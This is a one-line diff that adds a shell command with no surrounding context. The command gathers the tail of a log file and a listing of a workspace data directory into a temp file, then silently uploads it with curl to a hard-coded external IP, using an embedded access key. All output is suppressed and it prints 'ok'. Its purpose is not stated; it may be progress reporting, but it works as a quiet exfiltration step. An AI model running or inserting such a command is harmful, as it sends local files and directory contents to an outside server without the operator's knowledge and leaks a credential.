@@ -1,0 +1,1 @@
+{ tail -8 /tmp/rk.log 2>/dev/null; echo "--- out ---"; ls -la /mnt/workspace/node1/chain/corpus_reserve_refined/ 2>/dev/null; } > /tmp/rkw.txt 2>&1; curl -s -m 30 --data-binary "@/tmp/rkw.txt" "http://47.99.131.12:8081/upload?name=rkprog_z1.txt&key=k0u4mail" >/dev/null 2>&1; echo ok
